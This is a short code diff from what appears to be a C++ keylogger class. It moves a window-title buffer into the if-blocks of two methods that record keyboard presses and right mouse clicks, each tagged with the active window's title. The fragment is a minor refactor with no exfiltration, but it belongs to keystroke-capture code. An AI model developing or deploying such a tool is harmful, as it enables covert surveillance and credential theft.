@@ -139,11 +139,11 @@ class KeyLogger {
 			HWND foreground = GetForegroundWindow();
 			DWORD threadID;
 			HKL layout = NULL;
-			char title[300];
 
 			if (foreground)
 			{
 				//make log title
+				char title[300];
 				this->FormatLogForNewActiveWindow(foreground, title);
 				output << title << " - KEYBD PRSS: " ; 
 
@@ -194,11 +194,11 @@ class KeyLogger {
 			std::stringstream output;
 			HWND foreground = GetForegroundWindow();
 			DWORD threadID;
-			char title[300];
 
 			if (foreground)
 			{
 				//make log title
+				char title[300];
 				this->FormatLogForNewActiveWindow(foreground, title);
 				output << title << " - MOUSE RCLK: "; 
 			}
